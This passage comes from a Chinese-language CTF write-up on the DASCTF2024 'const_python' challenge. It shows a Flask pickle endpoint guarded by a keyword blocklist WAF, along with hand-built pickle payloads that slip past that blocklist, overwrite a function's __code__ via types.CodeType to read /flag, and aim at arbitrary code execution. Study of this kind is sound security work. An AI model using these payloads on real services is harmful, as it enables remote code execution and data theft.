+</span></span><span class="line"><span class="cl"><span class="n">g10</span> <span class="o">=</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;encoding&#39;</span><span class="p">,))</span><span class="c1">#g10 = getattr(g2,&#34;co_consts&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g11</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_names&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g12</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_varnames&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g13</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_filename&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g14</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_name&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g15</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_firstlineno&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g16</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_lnotab&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g17</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_freevars&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g18</span> <span class="o">=</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">g2</span><span class="p">,</span><span class="s2">&#34;co_cellvars&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">g19</span> <span class="o">=</span> <span class="n">types</span><span class="o">.</span><span class="n">CodeType</span><span class="p">(</span><span class="n">g3</span><span class="p">,</span><span class="n">g4</span><span class="p">,</span><span class="n">g5</span><span class="p">,</span><span class="n">g6</span><span class="p">,</span><span class="n">g7</span><span class="p">,</span><span class="n">g8</span><span class="p">,</span><span class="n">g9</span><span class="p">,</span><span class="n">g10</span><span class="p">,</span><span class="n">g11</span><span class="p">,</span><span class="n">g12</span><span class="p">,</span><span class="n">g13</span><span class="p">,</span><span class="n">g14</span><span class="p">,</span><span class="n">g15</span><span class="p">,</span><span class="n">g16</span><span class="p">,</span><span class="n">g17</span><span class="p">,</span><span class="n">g18</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">g20</span> <span class="o">=</span> <span class="n">builtins</span><span class="o">.</span><span class="n">setattr</span>
+</span></span><span class="line"><span class="cl"><span class="n">g20</span><span class="p">(</span><span class="n">src</span><span class="p">,</span><span class="s2">&#34;__code__&#34;</span><span class="p">,</span><span class="n">g19</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">src</span><span class="p">())</span>
+</span></span></code></pre></div><blockquote>
+<p>这里<code>types.CodeType</code>参数不能少就上面这些，然后构造的话其实可以直接<code>myevil.__code__.__dir__()</code>查看我们恶意函数就行，然后通过<code>builtins.setattr</code>进行赋值，有一点要注意<code>参数赋值的顺序</code>和<code>__dir__()</code>例出来的顺序有点不一样，要注意</p>
+</blockquote>
+<h2 id="例题-const_python">例题 const_python<a hidden class="anchor" aria-hidden="true" href="#例题-const_python">#</a></h2>
+<p><a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc=#Yk07Q">DASCTF2024最后一战｜寒夜破晓，冬至终章 官方WP</a></p>
+<p>我觉得这个题还是<code>不错的</code>，然后知道上面两个知识点就可以看这个题了,这里简短代码列出两个主要部分</p>
+<p>总得来说，就是有个<code>pickle反序列化的接口</code>但是有waf（尽管这个被绕了），然后我们可以通过<code>pickle</code>反序列化这个点来<code>执行python代码</code>调用<code>types.CodeType</code>动态修改<code>函数</code>，然后通过<code>访问路由</code>来调用我们的<code>恶意函数</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/src&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">src</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>  <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;app.py&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/ppicklee&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ppicklee</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;not allowed&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;not allowed&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">pickle_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">{</span><span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;eval&#34;</span><span class="p">,</span> <span class="s1">&#39;setstate&#39;</span><span class="p">,</span> <span class="s2">&#34;globals&#34;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="s1">&#39;__builtins__&#39;</span><span class="p">,</span> <span class="s1">&#39;template&#39;</span><span class="p">,</span> <span class="s1">&#39;render&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                 <span class="s1">&#39;compile&#39;</span><span class="p">,</span> <span class="s1">&#39;requests&#39;</span><span class="p">,</span> <span class="s1">&#39;exit&#39;</span><span class="p">,</span>  <span class="s1">&#39;pickle&#39;</span><span class="p">,</span><span class="s2">&#34;class&#34;</span><span class="p">,</span><span class="s2">&#34;mro&#34;</span><span class="p">,</span><span class="s2">&#34;flask&#34;</span><span class="p">,</span><span class="s2">&#34;sys&#34;</span><span class="p">,</span><span class="s2">&#34;base&#34;</span><span class="p">,</span><span class="s2">&#34;init&#34;</span><span class="p">,</span><span class="s2">&#34;config&#34;</span><span class="p">,</span><span class="s2">&#34;session&#34;</span><span class="p">}:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="ow">in</span> <span class="n">pickle_data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">i</span><span class="o">+</span><span class="s2">&#34; waf !!!!!!!&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;success pickle&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;fail pickle&#34;</span>
+</span></span></code></pre></div><p>然后思路清晰了，就是构造poc</p>
+<h3 id="调试demo">调试demo<a hidden class="anchor" aria-hidden="true" href="#调试demo">#</a></h3>
+<p>这里举个例子，用来看我们设置的临时变量对不对</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">types</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">secrets</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">builtins</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pickle_data</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;&#39;&#39;(NS&#39;flag&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;r&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;utf-8&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">(S&#39;encoding&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">ttp10
+</span></span></span><span class="line"><span class="cl"><span class="s1">c__main__
+</span></span></span><span class="line"><span class="cl"><span class="s1">s
+</span></span></span><span class="line"><span class="cl"><span class="s1">(S&#39;name&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">g10
+</span></span></span><span class="line"><span class="cl"><span class="s1">db.&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Secret</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="n">Secret</span><span class="p">((</span><span class="s2">&#34;sd&#34;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
+</span></span></code></pre></div><p>然后这里我放一个官方wp的poc吧，不知道怎么来的，可以看上面<code>pickle demo</code>，这里就是通过pickle反序列化来调用函数，实现<code>types.CodeType</code>对<code>src.__code__</code>的修改，但是官方的poc<code>很局限</code>只是把<code>src函数</code>中<code>app.py</code>字符串修改为<code>/flag</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">op3</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;&#39;cbuiltins
+</span></span></span><span class="line"><span class="cl"><span class="s1">getattr
+</span></span></span><span class="line"><span class="cl"><span class="s1">p0
+</span></span></span><span class="line"><span class="cl"><span class="s1">c__main__
+</span></span></span><span class="line"><span class="cl"><span class="s1">src
+</span></span></span><span class="line"><span class="cl"><span class="s1">p3
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g3
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;__code__&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp4
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_argcount&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp5
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_argcount&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp6
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_kwonlyargcount&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp7
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_nlocals&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp8
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_stacksize&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp9
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_flags&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp10
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_code&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp11
+</span></span></span><span class="line"><span class="cl"><span class="s1">(NS&#39;/flag&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;r&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;utf-8&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">(S&#39;encoding&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">ttp12
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_names&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp13
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_varnames&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp14
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_filename&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp15
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_name&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp16
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_firstlineno&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp17
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_lnotab&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp18
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_freevars&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp19
+</span></span></span><span class="line"><span class="cl"><span class="s1">g0
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g4
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;co_cellvars&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp20
+</span></span></span><span class="line"><span class="cl"><span class="s1">ctypes
+</span></span></span><span class="line"><span class="cl"><span class="s1">CodeType
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g5
+</span></span></span><span class="line"><span class="cl"><span class="s1">I0
+</span></span></span><span class="line"><span class="cl"><span class="s1">g7
+</span></span></span><span class="line"><span class="cl"><span class="s1">g8
+</span></span></span><span class="line"><span class="cl"><span class="s1">g9
+</span></span></span><span class="line"><span class="cl"><span class="s1">g10
+</span></span></span><span class="line"><span class="cl"><span class="s1">g11
+</span></span></span><span class="line"><span class="cl"><span class="s1">g12
+</span></span></span><span class="line"><span class="cl"><span class="s1">g13
+</span></span></span><span class="line"><span class="cl"><span class="s1">g14
+</span></span></span><span class="line"><span class="cl"><span class="s1">g15
+</span></span></span><span class="line"><span class="cl"><span class="s1">g16
+</span></span></span><span class="line"><span class="cl"><span class="s1">g17
+</span></span></span><span class="line"><span class="cl"><span class="s1">g18
+</span></span></span><span class="line"><span class="cl"><span class="s1">g19
+</span></span></span><span class="line"><span class="cl"><span class="s1">g20
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp21
+</span></span></span><span class="line"><span class="cl"><span class="s1">cbuiltins
+</span></span></span><span class="line"><span class="cl"><span class="s1">setattr
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g3
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#34;__code__&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">g21
+</span></span></span><span class="line"><span class="cl"><span class="s1">tR.&#39;&#39;&#39;</span>
+</span></span></code></pre></div><h1 id="实现接管任意函数">[*]实现接管任意函数<a hidden class="anchor" aria-hidden="true" href="#实现接管任意函数">#</a></h1>
+<p>那我想达到什么效果呢，<code>修改任意函数，任意函数代码</code>，举个例子,这里secret函数相当于一个空函数，将他修改成和<code>src一样的效果</code>，或者说是<code>修改成一个命令执行的函数</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">src</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>  <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;app.py&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">secret</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> 
+</span></span></code></pre></div><p>其实用<code>types.CodeType</code>=&gt;<code>执行python代码</code>很容易实现，但是这里我们要用pickle反序列化来实现这个效果，也就是要保证<code>types.CodeType参数的赋值</code>，这里获取<code>src.__code__.__dir__()</code>得到src函数的对应值。这里经过测试<code>co_filename</code>和<code>co_name</code>其实没啥影响，然后<code>co_lnotab</code>一般也就是下面的默认值。</p>
+<blockquote>
+<p>co_filename co_name co_lnotab 这几个值我们直接获取原函数的值就好</p>
+</blockquote>
+<p>然后最麻烦的问题就是<code>co_code</code>这个值，他是<code>byte</code>类型的，用<code>V</code>操作码uincode这种是不行的，V这种还是属于<code>string</code>跟byte其实不搭边</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">co_argcount</span> <span class="p">:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_posonlyargcount</span> <span class="p">:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_kwonlyargcount</span> <span class="p">:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_nlocals</span> <span class="p">:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_stacksize</span> <span class="p">:</span> <span class="mi">5</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_flags</span> <span class="p">:</span> <span class="mi">67</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_code</span> <span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;t</span><span class="se">\x00</span><span class="s1">d</span><span class="se">\x01</span><span class="s1">d</span><span class="se">\x02</span><span class="s1">d</span><span class="se">\x03</span><span class="s1">d</span><span class="se">\x04\x8d\x03\xa0\x01\xa1\x00</span><span class="s1">S</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_consts</span> <span class="p">:</span> <span class="p">(</span><span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;app.py&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;encoding&#39;</span><span class="p">,))</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_names</span> <span class="p">:</span> <span class="p">(</span><span class="s1">&#39;open&#39;</span><span class="p">,</span> <span class="s1">&#39;read&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_varnames</span> <span class="p">:</span> <span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_freevars</span> <span class="p">:</span> <span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_cellvars</span> <span class="p">:</span> <span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_filename</span> <span class="p">:</span> <span class="n">c</span><span class="p">:</span><span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="n">jie</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="mf">4.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_name</span> <span class="p">:</span> <span class="n">src</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_firstlineno</span> <span class="p">:</span> <span class="mi">7</span>
+</span></span><span class="line"><span class="cl"><span class="n">co_lnotab</span> <span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x01</span><span class="s1">&#39;</span>
+</span></span></code></pre></div><h3 id="co_code-解决">co_code 解决<a hidden class="anchor" aria-hidden="true" href="#co_code-解决">#</a></h3>
+<ol>
+<li>然后我又再指令集里面翻呀翻，里面是看到跟<code>byte有关的操作码</code>，但其实都不能用（反正我没成功）</li>
+</ol>
+<p>然后这种直接把值给到变量里这种我也试过，但是没啥用，显示的是C操作码，但是实现不了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Secret</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="n">Secret</span><span class="p">(</span><span class="n">src</span><span class="o">.</span><span class="vm">__code__</span><span class="o">.</span><span class="n">co_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># s=Secret(&#34;sfsd&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">src</span><span class="o">.</span><span class="vm">__code__</span><span class="o">.</span><span class="n">co_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickletools</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">dmup</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">dmup</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pickletools</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="n">dmup</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#    38: \x8c SHORT_BINUNICODE &#39;name&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#    44: \x94 MEMOIZE    (as 5)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#    45: C    SHORT_BINBYTES b&#39;t\x00d\x01d\x02d\x03d\x04\x8d\x03\xa0\x01\xa1\x00S\x00&#39;</span>
+</span></span></code></pre></div><ol start="2">
+<li>这里我也看了下pker，但是其实它还不支持这种</li>
+<li><strong>解决byte传输</strong></li>
+</ol>
+<p>在我郁闷之际，又是参考文章救了我，我一眼看到<code>pickle 0版本</code>这不就是<code>手搓的poc</code>么，一个想法油然而生我看看<code>pickle0</code>咋赋值得呗</p>
+<p><img loading="lazy" src="images/image-20241231114748145.png" alt="image-20241231114748145"  />
+</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="n">Secret</span><span class="p">(</span><span class="n">src</span><span class="o">.</span><span class="vm">__code__</span><span class="o">.</span><span class="n">co_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">dmup</span><span class="o">=</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">protocol</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">dmup</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># b&#39;ccopy_reg\n_reconstructor\np0\n(c__main__\nSecret\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nc_codecs\nencode\np7\n(Vt\\u0000d\x01d\x02d\x03d\x04\x8d\x03\xa0\x01\xa1\\u0000S\\u0000\np8\nVlatin1\np9\ntp10\nRp11\nsb.&#39;</span>
+</span></span></code></pre></div><p>格式化下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ccopy_reg</span>
+</span></span><span class="line"><span class="cl"><span class="n">_reconstructor</span>
+</span></span><span class="line"><span class="cl"><span class="n">p0</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">c__main__</span>
+</span></span><span class="line"><span class="cl"><span class="n">Secret</span>
+</span></span><span class="line"><span class="cl"><span class="n">p1</span>
+</span></span><span class="line"><span class="cl"><span class="n">c__builtin__</span>
+</span></span><span class="line"><span class="cl"><span class="nb">object</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ntp3</span>
+</span></span><span class="line"><span class="cl"><span class="n">Rp4</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">dp5</span>
+</span></span><span class="line"><span class="cl"><span class="n">Vname</span>
+</span></span><span class="line"><span class="cl"><span class="n">p6</span>
+</span></span><span class="line"><span class="cl"><span class="n">c_codecs</span>
+</span></span><span class="line"><span class="cl"><span class="n">encode</span>
+</span></span><span class="line"><span class="cl"><span class="n">p7</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">Vt</span>\\<span class="n">u0000d</span>\<span class="n">x01d</span>\<span class="n">x02d</span>\<span class="n">x03d</span>\<span class="n">x04</span>\<span class="n">x8d</span>\<span class="n">x03</span>\<span class="n">xa0</span>\<span class="n">x01</span>\<span class="n">xa1</span>\\<span class="n">u0000S</span>\\<span class="n">u0000</span>
+</span></span><span class="line"><span class="cl"><span class="n">p8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Vlatin1</span>
+</span></span><span class="line"><span class="cl"><span class="n">p9</span>
+</span></span><span class="line"><span class="cl"><span class="n">tp10</span>
+</span></span><span class="line"><span class="cl"><span class="n">Rp11</span>
+</span></span><span class="line"><span class="cl"><span class="n">sb</span><span class="o">.</span>
+</span></span></code></pre></div><p>我们注意到<code>_codecs.encode</code>，调用发现可以将我们uincode字符串转换成<code>byte</code>，这不就成了？</p>
+<p>实则不然，给我报了个这个错</p>
+<p><img loading="lazy" src="images/b879233734012c68f6dea907d5b5deb.png" alt="b879233734012c68f6dea907d5b5deb"  />
+</p>
